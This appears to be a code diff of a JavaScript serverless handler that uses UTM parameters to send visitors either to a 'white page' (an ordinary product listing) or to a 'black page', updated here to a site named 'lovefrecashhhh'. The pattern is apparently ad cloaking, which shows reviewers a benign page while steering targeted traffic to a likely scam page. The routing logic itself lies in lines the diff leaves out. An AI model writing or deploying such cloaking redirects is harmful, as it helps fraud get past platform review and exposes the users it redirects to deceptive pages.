@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://pinkpetals.pk/collections/new-arrivals/products/amber-gold?variant=46468169203935";
-    const blackPageURL = "https://cggkidswear.myfunnelish.com/super-active-toddler-jacket";
+    const whitePageURL = "https://www.wantitall.co.za/HISTOYE-Baby-Crawling-Toys-Baby-Toys-612-Months-Bilingual-Toys-Spanish-English-Infant-Toddler-Toys-36-612-1218-ap-B096FT7PPP.html";
+    const blackPageURL = "https://lovefrecashhhh.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -24,4 +24,5 @@ export default function handler(req, res) {
     }
   
     res.end();
+
   }
